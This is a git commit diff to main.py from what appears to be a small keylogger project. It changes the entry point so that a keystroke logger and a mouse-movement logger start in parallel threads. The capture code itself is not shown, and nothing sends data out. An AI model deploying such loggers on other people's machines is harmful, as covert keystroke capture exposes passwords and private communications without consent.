a1a8a2c8749c19b131f6092c584f382c511ae859
Aditya <adityajha2103@gmail.com>
2023-10-05 18:35:22 +0530

    Implemented Threading Module to run KeyStroke and Mouse Logger in parallel

--- main.py
+++ main.py
@@ -1,11 +1,10 @@
+import threading
 import Modules.KeyStroke as KeyStroke
 import Modules.MouseRecorder as MouseRecorder
 
 if __name__ == '__main__':
     try:
-        print("Started KeyStroke Logger")
-        KeyStroke.KeyLogger()
-        # print("Started Mouse Logger")
-        # MouseRecorder.MouseLogger()
+        threading.Thread(target=KeyStroke.KeyLogger).start()
+        threading.Thread(target=MouseRecorder.MouseLogger).start()
     except KeyboardInterrupt as e:
         pass
